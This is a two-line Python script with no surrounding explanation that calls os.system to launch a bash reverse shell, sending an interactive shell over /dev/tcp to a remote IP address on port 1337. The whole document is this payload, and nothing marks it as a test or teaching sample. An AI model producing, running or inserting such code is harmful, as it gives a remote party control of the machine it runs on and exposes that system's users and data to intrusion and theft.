import os
os.system('bash -i >& /dev/tcp/103.251.89.204/1337 0>&1')